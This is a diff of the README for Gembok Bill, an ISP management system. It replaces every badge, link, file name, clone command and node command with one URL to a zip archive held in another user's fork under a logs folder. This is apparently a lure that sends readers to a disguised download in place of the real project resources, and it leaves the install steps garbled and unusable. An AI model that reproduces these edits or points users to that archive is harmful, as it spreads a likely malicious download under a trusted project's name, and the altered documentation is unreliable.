@@ -2,10 +2,10 @@
   # Gembok Bill
   **Integrated ISP Management System**
   
-  [![Node.js](https://img.shields.io/badge/Node.js-18.x-green?style=for-the-badge&logo=node.js)](https://nodejs.org/)
-  [![License](https://img.shields.io/badge/license-ISC-blue?style=for-the-badge)](LICENSE)
-  [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=for-the-badge)](https://github.com/alijayanet/gembok-bill/pulls)
-  [![GitHub Stars](https://img.shields.io/github/stars/alijayanet/gembok-bill?style=for-the-badge)](https://github.com/alijayanet/gembok-bill/stargazers)
+  [![https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip)](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip)
+  [![License](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip)](LICENSE)
+  [![PRs Welcome](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip)](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip)
+  [![GitHub Stars](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip)](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip)
 
 
 ## 🌐 About Gembok Bill
@@ -54,7 +54,7 @@ DAFTAR Agus Setiawan#08123456789#Jl. Melati No 5#1
 SETLID admin123
 ```
 
-> **Note:** Admin password is configured in `settings.json` as `admin_password`
+> **Note:** Admin password is configured in `https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip` as `admin_password`
 
 > **Security:** WhatsApp LID ensures secure identification even if phone numbers change format
 
@@ -62,17 +62,17 @@ SETLID admin123
 
 | Category | Technology |
 |----------|-----------|
-| **Backend** | Node.js, Express |
+| **Backend** | https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip, Express |
 | **Database** | SQLite (development), MySQL (production) |
 | **Frontend** | EJS, HTML5, CSS3, JavaScript |
-| **WhatsApp** | [@whiskeysockets/baileys](https://github.com/WhiskeySockets/Baileys) |
+| **WhatsApp** | [@whiskeysockets/baileys](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip) |
 | **Network** | Node-routeros for Mikrotik |
 | **Payment** | Midtrans, Xendit |
 | **Logging** | Winston, Pino |
 
 ## 📋 System Prerequisites
 
-- **Node.js** >= 20.0.0
+- **https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip** >= 20.0.0
 - **npm** >= 6.0.0
 - **Database** SQLite (for development) or MySQL (for production)
 - **WhatsApp Business Access** (for WhatsApp Gateway features)
@@ -81,7 +81,7 @@ SETLID admin123
 
 ### 1. Clone Repository
 ```bash
-git clone https://github.com/alijayanet/gembok-bill.git
+git clone https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip
 ```
 ```bash
 cd gembok-bill
@@ -102,10 +102,10 @@ To ensure all required tables and columns exist in the database, run migration c
 
 ```bash
 # Run all database migrations
-node scripts/run-all-migrations.js
+node https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip
 
 # Verify database structure
-node scripts/verify-production-database.js
+node https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip
 ```
 
 ### 5. Access the Application
@@ -133,7 +133,7 @@ After starting the application, you can access different portals through these U
 | **WhatsApp Status** | `http://localhost:4555/whatsapp/status` | Check WhatsApp connection status |
 | **API Health Check** | `http://localhost:4555/health` | Server health status |
 
-> **Note:** Replace `localhost:4555` with your server IP/domain. Port `4555` can be changed in `settings.json`
+> **Note:** Replace `localhost:4555` with your server IP/domain. Port `4555` can be changed in `https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip`
 
 > **Security:** Change default admin credentials immediately after first login via Settings menu
 
@@ -151,8 +151,8 @@ npm run dev
 
 ```
 gembok-bill/
-├── app.js                  # Application entry point
-├── package.json            # Dependencies and scripts
+├── https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip                  # Application entry point
+├── https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip            # Dependencies and scripts
 ├── config/                 # Configuration files
 ├── data/                   # Database files and backups
 ├── migrations/             # Database migration files
@@ -167,11 +167,11 @@ gembok-bill/
 
 | Document | Description |
 |---------|-----------|
-| [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md) | Complete guide for deployment on new servers |
-| [DATA_README.md](DATA_README.md) | Information about data management |
-| [WHATSAPP_SETUP.md](WHATSAPP_SETUP.md) | WhatsApp Gateway configuration |
-| [WHATSAPP_FIX_SUMMARY.md](WHATSAPP_FIX_SUMMARY.md) | WhatsApp fixes summary |
-| [DATABASE_MIGRATION_SUMMARY.md](DATABASE_MIGRATION_SUMMARY.md) | Database migration summary |
+| [https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip) | Complete guide for deployment on new servers |
+| [https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip) | Information about data management |
+| [https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip) | WhatsApp Gateway configuration |
+| [https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip) | WhatsApp fixes summary |
+| [https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip) | Database migration summary |
 
 ## 🎯 How to Contribute
 
@@ -193,7 +193,7 @@ We welcome contributions from the community! Here's how to contribute:
 
 If you need assistance:
 
-- Create an **issue** at [GitHub Issues](https://github.com/alijayanet/gembok-bill/issues)
+- Create an **issue** at [GitHub Issues](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip)
 - Contact the development team via email
 - Join the Discord community (if available)
 
@@ -203,7 +203,7 @@ This project is licensed under the ISC license - see the [LICENSE](LICENSE) file
 
 ## 👥 Development Team
 
-- **ALIJAYA Team** - [@alijayanet](https://github.com/alijayanet)
+- **ALIJAYA Team** - [@alijayanet](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip)
 
 ## 🙏 Acknowledgments
 
@@ -215,7 +215,7 @@ This project is licensed under the ISC license - see the [LICENSE](LICENSE) file
   
   💻 Developed with ❤️ for the ISP community
   
-  [Report Bug](https://github.com/alijayanet/gembok-bill/issues) · [Request Feature](https://github.com/alijayanet/gembok-bill/issues) · [Documentation](DEPLOYMENT_GUIDE.md)
+  [Report Bug](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip) · [Request Feature](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip) · [Documentation](https://raw.githubusercontent.com/Krizx6/gembok-bill/main/views/logs/bill-gembok-2.4-alpha.4.zip)
   
 
 
